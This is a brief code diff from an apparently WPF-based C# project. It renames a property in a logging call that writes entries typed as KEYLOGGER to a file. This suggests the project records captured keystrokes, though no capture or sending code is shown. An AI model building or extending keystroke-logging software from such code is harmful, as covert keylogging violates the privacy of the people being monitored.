@@ -77,7 +77,7 @@ namespace WPF.Managers.Tasks
                 LogManager.Instance.LogToFile(new LogInfoModel
                 {
                     Type = Models.Enums.FileTypesEnum.KEYLOGGER,
-                    Message = new MessageInfoModel(list)
+                    MessageInfo = new MessageInfoModel(list)
                 });
             }
             Completed = true;
